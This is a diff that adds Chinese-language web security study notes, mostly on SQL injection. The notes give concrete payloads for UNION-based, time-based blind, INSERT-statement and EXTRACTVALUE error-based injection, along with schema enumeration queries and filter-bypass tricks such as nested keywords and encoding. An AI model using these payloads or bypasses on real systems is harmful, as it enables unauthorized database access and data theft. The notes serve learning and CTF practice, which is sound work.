@@ -1,6 +1,23 @@
 # Web
 [Web安全学习笔记](https://websec.readthedocs.io/zh/latest/vuln/index.html)
 
+Web漏洞挖掘的关键：
+- 全面的信息收集
+- 完整的功能分析
+- 清晰的利用逻辑
+- 丰富的知识储备
+更重要的是耐心！
+
+
+[每日推送Bug Bounty相关文章](https://t.me/thebugbountyhunter )
+
+[专门做CTF的Youtube博主](https://www.youtube.com/@_JohnHammond)
+
+[DEFCON](https://www.youtube.com/@DEFCONConference)
+
+[request库的使用](https://www.runoob.com/python3/python-requests.html)
+
+
 === "静态网页"
     完全“按原样”呈现给浏览器的网页
     - 由 HTML、CSS 和 JavaScript 组成，可能含有图片、视频等静态资源
@@ -71,6 +88,229 @@
 
 !!! note "本质"
     把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则
+
+### 直接回显的注入
+存在注入->SQL语句可以以一种“意料之外”的方式被解析
+
+![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240709155833.png)
+
+传入全部各种特殊字符 '"~!@#$%^&*()`
+```sql
+SELECT col_name(…) FROM table_name WHERE id = '"~!@#$%^&*()`       /*数字型*/
+```
+
+```sql
+SELECT col_name(…) FROM table_name WHERE id = ''"~!@#$%^&*()`'     /*字符型*/
+```
+
+不管内部结构怎么样，这样肯定能出错，检测效率高
+
+
+借助联合查询:
+```sql
+SELECT field1, fieldN FROM table_name UNION SELECT field1*, …, fieldN* FROM table_name*;
+```
+
+!!! note "如何确定sql数据库有多少列"
+    ```sql
+    SELECT * FROM TABLE_NAME ORDER BY 1; /* 1,2,3,4 */
+    ```
+    如果有正常返回，则说明可以继续尝试
+
+
+我们可以尝试传入`id=1 UNION SELECT {secret_data}` 从而使拼接的SQL语句变为：
+```sql
+SELECT col_name(…) FROM table_name WHERE id = 1 UNION SELECT {secret_data};
+```
+这样，联合查询就会覆盖SQL查询的结果，并借助PHP代码实现的HTML嵌入，将我们想要的信息嵌在页面里传回来！
+
+在MySQL中，所有的数据库名存放在information_schema.schemata的schema_name字段下
+```sql
+SELECT schema_name FROM information_schema.schemata;
+```
+所有的表名存放在information_schema.tables的table_name字段下，可以以table_schema为条件筛选
+```sql
+SELECT table_name FROM information_schema.tables WHERE table_schema='db_name';
+```
+
+所有的列名存放在information_schema.columns的column_name字段下，可以以table_schema和table_name为条件筛选
+```sql
+SELECT column_name FROM information_schema.columns WHERE table_name='table_name' AND table_schema='db_name';
+```
+
+
+
+
+
+### 无回显的注入
+
+传入uname='
+```sql
+SELECT col_name(…) FROM table_name WHERE username = ''' /*报错*/
+```
+而uname="时
+```sql
+SELECT col_name(…) FROM table_name WHERE username = '"' /*不报错*/
+```
+说明是单引号闭合
+
+
+!!! note "sql将所有字符串认为都是0"
+    如果传入的是字符串，那么sql会将其认为是0，所以`id='0'`和`id='1'`是等价的
+
+    所以会将该列的全部字符串都进行返回
+
+
+    ```sql
+    SELECT * FROM table_name WHERE id = '0' OR '1'='1';
+    ```
+    无论id是否为0，这个条件永远为真
+
+
+![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240709152231.png)
+
+延时注入：1bit信息不足以满足要求
+
+不管返回什么值，只关心返回的时间。泛用性最广
+
+
+
+`SUBSTR(str, pos, len) `可截取字符串
+str参数代表待截取的字符串
+pos参数代表从什么位置开始截取(下标从1开始)
+len参数表示字符串截取的⻓度
+
+`ASCII(char)`将字符转为ASCII码
+
+那么，我们用`SUBSTR()`一位位取出要查找内容的字符，再用`ASCII()`转化为ASCII码，就能用二分法获取数据了
+
+
+```sql
+IF(condition, true, false)
+```
+如果condition为真就执行expr1，反之执行expr2
+
+和`SLEEP()`配合，就能通过测量响应时间来获取数据！
+
+
+```sql
+SELECT col_name(…) FROM table_name WHERE username = 'admin' and IF(ASCII(SUBSTR(DATABASE(), 1, 1))>0, SLEEP(0), SLEEP(2))#'
+```
+
+如果延时超过2秒，说明条件为假，反之为真
+
+!!! note "and 和or的使用"
+    and 找False值
+    or 找 True值
+    但延时注入的时候，如果or前为恒假值，那么就会遍历整个数据库，即会延时很久。
+    所以应该先找到一个恒正值，再使用and
+
+### 一些特殊的注入
+
+
+是否有可能注入INSERT, UPDATE, DELETE语句？
+
+
+假设某用户注册场景，username/email/password分别用POST参数uname&email&passwd传入
+```sql
+INSERT INTO `users` VALUES (100, '{username}', '{email}', '{password}');
+```
+
+
+在不知道SQL语句结构的情况下，最保险的方案是时间盲注，只需简单闭合即可
+传入`uname='='' AND IF({condition}, SLEEP(0), SLEEP(5)) AND ''='&email=a&passwd=b` 语句变为
+
+```sql
+INSERT INTO `users` VALUES (100, ''='' AND IF({condition}, SLEEP(0), SLEEP(5)) AND ''='', 'a', 'b');
+```
+
+如果已经知道INSERT语句的结构，我们可以直接篡改后续的插入内容
+传入`uname=', DATABASE(), '')#&email=a&passwd=b` 语句变为
+
+
+```sql
+INSERT INTO `users` VALUES (100, '', DATABASE(), '')#', 'a', 'b');
+```
+注册用户的email栏会直接展示数据库名
+
+
+!!! note  "一个仅限MySQL的技巧"
+    传入`uname=0'|CONV(HEX(SUBSTR(USER(),1, 8)),16, 10)|'0&email=a&passwd=b`
+
+    ```sql
+    INSERT INTO `users` VALUES (100, '0'|CONV(HEX(SUBSTR(USER(),1, 8)),16, 10)|'0', 'a', 'b');
+    ```
+    将结果转换回字符即可UNHEX(CONV(res, 10, 16))
+
+#### 报错注入
+
+核心思想就是让我们要查询的信息输出到报错信息中去
+
+`EXTRACTVALUE(xml_document,Xpath_string)`
+使⽤Xpath格式的字符串从xml_document中获得内容，Xpath格式(一般为/a/b/…)错误就会报错，报错信息中会输出`Xpath_string`
+
+那么我们可以刻意构造错误的`Xpath_string`和我们想要查询的数据拼接
+比如，只要查询中执行了 `EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))` 就必定报错(0x7e是~的编码)，DATABASE()会作为Xpath的一部分出现在报错信息中
+这个技巧可以用在任何回显报错信息的场景中。同理还有很多其他的MySQL可用的报错注入函数。
+
+```sql
+mysql> select EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e));
+ERROR 1105 (HY000): XPATH syntax error: '~web~'
+```
+由上面结果可知，database名字被获取到了
+
+#### 二次注入
+
+对数据进行转义是为了防止SQL语句执行时出现问题，存储的原始数据并没有转义。
+那么，如果某个数据被存入时携带了恶意的SQL语句，由于存入操作进行了良好的转义没有造成注入，但是服务端的其他功能读取这串数据用于拼接SQL语句时没有转义，可能也会造成注入。
+
+![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240710112244.png)
+
+### SQL注入的绕过
+常见防护方法：
+
+- 直接拦截
+
+- 关键字替换
+
+- 编码转义
+
+- 参数化查询：不会把参数执行
+
+
+
+1. 关键字匹配(直接查找/正则)
+
+2. 语义匹配
+
+**绕过方法**
+- 针对关键字/正则匹配
+- 大小写
+- 利用等价命令 比如 `OR->||, SPACE->/**/, ORDER BY->GROUP BY …`
+- 如果只是单纯删去关键字，且只删一次，可以嵌套绕过，比如`UNION`是关键字会被删除，那么传入`UNUNIONION`就会被删成`UNION`，从而注入
+
+- 超长字符串绕过
+- 多次编码(需要服务端有相应解码功能)
+- `%00`截断/换行截断
+- 改变请求方式 `GET->POST`, `?a=1 -> /a/1`
+
+
+针对语义匹配
+相对难度较大，只能利用语言特性把语义检测绕晕。常见办法是嵌套注释符让其以为全部内容都被注释了。
+
+
+
+### 一个SQL注入攻击实例
+
+![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240709162751.png)
+
+!!! note "sql注入的本质"
+    SQL注入产生在服务端运行的编程语言和SQL服务器的边界上
+    SQL注入的本质是构造一条产生有效信息输送的信息链！
+
+
+漏洞产生在哪一个边界上决定了漏洞的类型而信息链如何被构造决定了漏洞的利用方式
+——Джерри Чу
 
 
 ## XSS | 跨站脚本攻击
@@ -199,3 +439,5 @@ def fetch_url(url):
         return "Access Denied"
     # 继续处理请求
 ```
+
+![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240709163411.png)
